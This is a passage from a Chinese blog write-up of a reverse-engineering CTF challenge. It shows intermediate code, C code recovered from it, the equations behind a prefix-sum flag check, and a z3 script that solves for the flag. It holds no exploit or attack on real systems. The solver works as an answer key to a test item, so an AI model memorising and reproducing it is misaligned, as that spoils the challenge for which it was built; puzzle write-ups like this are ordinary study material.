var19&lt;+88&gt;</span><br><span class="line">  temp203 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp203</span><br><span class="line">  GOTO label126</span><br><span class="line">LABEL label124 :</span><br><span class="line">  temp207 := #1</span><br><span class="line">  var15&lt;+56&gt; := temp207</span><br><span class="line">LABEL label137 :</span><br><span class="line">  temp209 := #24</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp209 GOTO label136</span><br><span class="line">  GOTO label135</span><br><span class="line">LABEL label136 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp210 := #1</span><br><span class="line">  temp211 := var15&lt;+56&gt; - temp210</span><br><span class="line">  var16&lt;+64&gt; := temp211</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; + var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">  temp208 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp208</span><br><span class="line">  GOTO label137</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LABEL label168 :</span><br><span class="line">  temp263 := #24</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp263 GOTO label167</span><br><span class="line">  GOTO label166</span><br><span class="line">LABEL label167 :</span><br><span class="line">  var16&lt;+64&gt; := var15&lt;+56&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var23(@exp.key[0])&lt;+8&gt;&lt;+872&gt;&lt;+tempa&gt;</span><br><span class="line">  var18&lt;+80&gt; := var15&lt;+56&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp264 := var17&lt;+72&gt; ^ var19&lt;+88&gt;</span><br><span class="line">  var21&lt;+104&gt; := temp264</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var23(@exp.key[0])&lt;+8&gt;&lt;+872&gt;&lt;+tempa&gt; := var21&lt;+104&gt;</span><br><span class="line">  temp262 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp262</span><br><span class="line">  GOTO label168</span><br></pre></td></tr></table></figure>
<ul>
<li>对 <code>e3.key(var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;)</code> 的前缀和差分加密会导致 <code>e3.key</code> 全为 “0”，进而对 <code>e2.key(var23(@exp.key[0])&lt;+8&gt;&lt;+872&gt;&lt;+tempa&gt;)</code> 的异或加密失效</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">LABEL label271 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var16&lt;+64&gt; := var25(@exp.L[0])&lt;+200&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var18&lt;+80&gt; := var25(@exp.R[0])&lt;+264&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var25(@exp.X[0])&lt;+328&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; - var20&lt;+96&gt;</span><br><span class="line">  var19&lt;+88&gt; := var19&lt;+88&gt; + var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt; := var19&lt;+88&gt;</span><br><span class="line">  temp369 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp369</span><br><span class="line">  GOTO label272</span><br><span class="line">LABEL label270 :</span><br><span class="line">  temp373 := #1</span><br><span class="line">  var15&lt;+56&gt; := temp373</span><br><span class="line">LABEL label283 :</span><br><span class="line">  temp375 := #24</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp375 GOTO label282</span><br><span class="line">  GOTO label281</span><br><span class="line">LABEL label282 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">  temp376 := #1</span><br><span class="line">  temp377 := var15&lt;+56&gt; - temp376</span><br><span class="line">  var16&lt;+64&gt; := temp377</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; + var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">  temp374 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp374</span><br><span class="line">  GOTO label283</span><br></pre></td></tr></table></figure>
<ul>
<li>对 <code>e4.key(var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;)</code> 的前缀和差分加密最后会得到一个 fake flag</li>
</ul>
<p>程序有效部分的核心逻辑如下：</p>
<ul>
<li>程序读取 flag 存入 <code>e1.key</code> 进行第一次前缀和差分，区间修改的操作数在 <code>e1.L，e1.R，e1.X</code> 中（已知）</li>
<li>将第一轮计算的结果间隔取8个存入 <code>e2.X</code>，当做第二次前缀和差分的操作数</li>
<li>第二次使用 <code>e1.L，e1.R，e2.X</code> 对 <code>e2.key</code>（已知）进行前缀和差分</li>
<li>最后对比 <code>e1.key</code> 和 <code>e2.key</code> 完全相同则 success</li>
</ul>
<p>前缀和差分相当于对 <code>[L，R)</code> 的所有数字 +X：</p>
<ul>
<li>由于第一次前缀和的操作数已知，得到结果 <code>e1.key[i]</code> 为 <code>INPUT[i] + C[i]</code></li>
<li>由于第二次前缀和差分需要用到第一次前缀和差分的结果，此时的 <code>X[i]</code> 已经变成 <code>INPUT[i*3] + C[i*3]</code>，结果 <code>e2.key[i]</code> 表达为 <code>INPUT[j1] + INPUT[j2] ...... INPUT[jn] + C[j]</code></li>
<li>由于 <code>e2.key</code> 的初始值已知，常数 <code>C[j]</code> 可通过 <code>e1.L，e1.R，e1.X</code> 算出，加密后的 <code>e1.key[i]</code> 可以由含有 <code>INPUT[j]</code> 的式子来表示，加密后的 <code>e2.key[i]</code> 也可以用含有 <code>INPUT[j]</code> 的式子来表示，两者结合可以得到 24 组一次方程</li>
</ul>
<p>通过中间代码提取出来的C代码样例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">    key1 = <span class="number">0</span>;</span><br><span class="line">    x = i;</span><br><span class="line">    key1 = flag[x];</span><br><span class="line">    y = <span class="number">23</span> - i;</span><br><span class="line">    e1.key[y] = key1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">23</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">    y = i;</span><br><span class="line">    ky = e1.key[y];</span><br><span class="line">    x = i - <span class="number">1</span>;</span><br><span class="line">    kx = e1.key[x]; </span><br><span class="line">    kz = ky - kx;</span><br><span class="line">    e1.key[i] = kz; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e1.L[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">e1.R[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">e1.X[<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line">e1.L[<span class="number">1</span>] = <span class="number">15</span>;</span><br><span class="line">e1.R[<span class="number">1</span>] = <span class="number">23</span>;</span><br><span class="line">e1.X[<span class="number">1</span>] = <span class="number">0</span><span class="number">-13</span>;</span><br><span class="line">e1.L[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">e1.R[<span class="number">2</span>] = <span class="number">11</span>;</span><br><span class="line">e1.X[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">e1.L[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line">e1.R[<span class="number">3</span>] = <span class="number">20</span>;</span><br><span class="line">e1.X[<span class="number">3</span>] = <span class="number">0</span><span class="number">-19</span>;</span><br><span class="line">e1.L[<span class="number">4</span>] = <span class="number">6</span>;</span><br><span class="line">e1.R[<span class="number">4</span>] = <span class="number">13</span>;</span><br><span class="line">e1.X[<span class="number">4</span>] = <span class="number">23</span>;</span><br><span class="line">e1.L[<span class="number">5</span>] = <span class="number">9</span>;</span><br><span class="line">e1.R[<span class="number">5</span>] = <span class="number">21</span>;</span><br><span class="line">e1.X[<span class="number">5</span>] = <span class="number">0</span><span class="number">-29</span>;</span><br><span class="line">e1.L[<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">e1.R[<span class="number">6</span>] = <span class="number">19</span>;</span><br><span class="line">e1.X[<span class="number">6</span>] = <span class="number">31</span>;</span><br><span class="line">e1.L[<span class="number">7</span>] = <span class="number">4</span>;</span><br><span class="line">e1.R[<span class="number">7</span>] = <span class="number">17</span>;</span><br><span class="line">e1.X[<span class="number">7</span>] = <span class="number">0</span><span class="number">-37</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">    x = e1.L[i];</span><br><span class="line">    y = e1.R[i];</span><br><span class="line">    z = e1.X[i];</span><br><span class="line">    kx = e1.key[x];</span><br><span class="line">    ky = e1.key[y];</span><br><span class="line">    kx += z;</span><br><span class="line">    ky -= z; </span><br><span class="line">    e1.key[x] = kx;</span><br><span class="line">    e1.key[y] = ky;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">    kx = e1.key[i];</span><br><span class="line">    x = i<span class="number">-1</span>;</span><br><span class="line">    z = e1.key[x];</span><br><span class="line">    kx += z;</span><br><span class="line">    e1.key[i] = kx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e2.key[<span class="number">0</span>]=<span class="number">252</span>;</span><br><span class="line">e2.key[<span class="number">1</span>]=<span class="number">352</span>;</span><br><span class="line">e2.key[<span class="number">2</span>]=<span class="number">484</span>;</span><br><span class="line">e2.key[<span class="number">3</span>]=<span class="number">470</span>;</span><br><span class="line">e2.key[<span class="number">4</span>]=<span class="number">496</span>;</span><br><span class="line">e2.key[<span class="number">5</span>]=<span class="number">487</span>;</span><br><span class="line">e2.key[<span class="number">6</span>]=<span class="number">539</span>;</span><br><span class="line">e2.key[<span class="number">7</span>]=<span class="number">585</span>;</span><br><span class="line">e2.key[<span class="number">8</span>]=<span class="number">447</span>;</span><br><span class="line">e2.key[<span class="number">9</span>]=<span class="number">474</span>;</span><br><span class="line">e2.key[<span class="number">10</span>]=<span class="number">577</span>;</span><br><span class="line">e2.key[<span class="number">11</span>]=<span class="number">454</span>;</span><br><span class="line">e2.key[<span class="number">12</span>]=<span class="number">466</span>;</span><br><span class="line">e2.key[<span class="number">13</span>]=<span class="number">345</span>;</span><br><span class="line">e2.key[<span class="number">14</span>]=<span class="number">344</span>;</span><br><span class="line">e2.key[<span class="number">15</span>]=<span class="number">486</span>;</span><br><span class="line">e2.key[<span class="number">16</span>]=<span class="number">501</span>;</span><br><span class="line">e2.key[<span class="number">17</span>]=<span class="number">423</span>;</span><br><span class="line">e2.key[<span class="number">18</span>]=<span class="number">490</span>;</span><br><span class="line">e2.key[<span class="number">19</span>]=<span class="number">375</span>;</span><br><span class="line">e2.key[<span class="number">20</span>]=<span class="number">257</span>;</span><br><span class="line">e2.key[<span class="number">21</span>]=<span class="number">203</span>;</span><br><span class="line">e2.key[<span class="number">22</span>]=<span class="number">265</span>;</span><br><span class="line">e2.key[<span class="number">23</span>]=<span class="number">125</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">    x = i + i + i;</span><br><span class="line">    kx = e1.key[x];</span><br><span class="line">    e2.X[i] = kx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">23</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">    y = i;</span><br><span class="line">    ky = e2.key[y];</span><br><span class="line">    x = i;</span><br><span class="line">    x -= <span class="number">1</span>;</span><br><span class="line">    kx = e2.key[x];</span><br><span class="line">    kz = ky - kx;</span><br><span class="line">    e2.key[i] = kz; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">    x = e1.L[i];</span><br><span class="line">    y = e1.R[i];</span><br><span class="line">    z = e2.X[i];</span><br><span class="line">    kx = e2.key[x];</span><br><span class="line">    ky = e2.key[y];</span><br><span class="line">    kx -= z;</span><br><span class="line">    ky += z; </span><br><span class="line">    e2.key[x] = kx;</span><br><span class="line">    e2.key[y] = ky;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">    kx = e2.key[i];</span><br><span class="line">    x = i<span class="number">-1</span>;</span><br><span class="line">    z = e2.key[x];</span><br><span class="line">    kx += z;</span><br><span class="line">    e2.key[i] = kx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是公式推导的过程：</p>
<img src="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/page1.png" class title="page1">     
<img src="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/page2.png" class title="page2">    
<img src="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/page3.png" class title="page3">    
<p>通过 z3 即可求解 flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    s.append(Int(<span class="string">&#x27;S&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">x = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">0</span>]+<span class="number">22</span> == <span class="number">252</span>)</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">1</span>]+<span class="number">23</span> == <span class="number">352</span>)</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">2</span>]+<span class="number">85</span> == <span class="number">484</span>)</span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">3</span>]+<span class="number">85</span> == <span class="number">470</span>)</span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">4</span>]+<span class="number">35</span> == <span class="number">496</span>)</span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">5</span>]+<span class="number">35</span> == <span class="number">487</span>)</span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">6</span>]+<span class="number">27</span> == <span class="number">539</span>)</span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">7</span>]+<span class="number">27</span> == <span class="number">585</span>)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">8</span>]+<span class="number">5</span> == <span class="number">447</span>)</span><br><span class="line"><span class="comment"># 9</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]-<span class="number">91</span> == <span class="number">474</span>)</span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">10</span>]-<span class="number">105</span> == <span class="number">577</span>)</span><br><span class="line"><span class="comment"># 11</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">11</span>]-<span class="number">167</span> == <span class="number">454</span>)</span><br><span class="line"><span class="comment"># 12</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">12</span>]-<span class="number">167</span> == <span class="number">466</span>)</span><br><span class="line"><span class="comment"># 13</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">13</span>]-<span class="number">159</span> == <span class="number">345</span>)</span><br><span class="line"><span class="comment"># 14</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">14</span>]-<span class="number">159</span> == <span class="number">344</span>)</span><br><span class="line"><span class="comment"># 15</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">15</span>]-<span class="number">113</span> == <span class="number">486</span>)</span><br><span class="line"><span class="comment"># 16</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">16</span>]-<span class="number">113</span> == <span class="number">501</span>)</span><br><span class="line"><span class="comment"># 17</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">17</span>]-<span class="number">63</span> == <span class="number">423</span>)</span><br><span class="line"><span class="comment"># 18</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">18</span>]-<span class="number">63</span> == <span class="number">490</span>)</span><br><span class="line"><span class="comment"># 19</span></span><br><span class="line">x.add(s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">19</span>]-<span class="number">64</span> == <span class="number">375</span>)</span><br><span class="line"><span class="comment"># 20</span></span><br><span class="line">x.add(s[<span class="number">15</span>]+s[<span class="number">3</span>]+s[<span class="number">20</span>]-<span class="number">50</span> == <span class="number">257</span>)</span><br><span class="line"><span class="comment"># 21</span></span><br><span class="line">x.add(s[<span class="number">3</span>]+s[<span class="number">21</span>]+<span class="number">46</span> == <span class="number">203</span>)</span><br><span class="line"><span class="comment"># 22</span></span><br><span class="line">x.add(s[<span class="number">3</span>]+s[<span class="number">22</span>]+<span class="number">46</span> == <span class="number">265</span>)</span><br><span class="line"><span class="comment"># 23</span></span><br><span class="line">x.add(s[<span class="number">23</span>] == <span class="number">125</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">    model = x.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line"></span><br><span class="line">model = x.model()</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(model).split(<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">    pos, val = i.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">    pos = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([i <span class="keyword">for</span> i <span class="keyword">in</span> pos <span class="keyword">if</span> i.isdigit()]))</span><br><span class="line">    val = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([i <span class="keyword">for</span> i <span class="keyword">in</span> val <span class="keyword">if</span> i.isdigit()]))</span><br><span class="line">    flag[pos] = <span class="built_in">chr</span>(val)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/21/Compiler%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
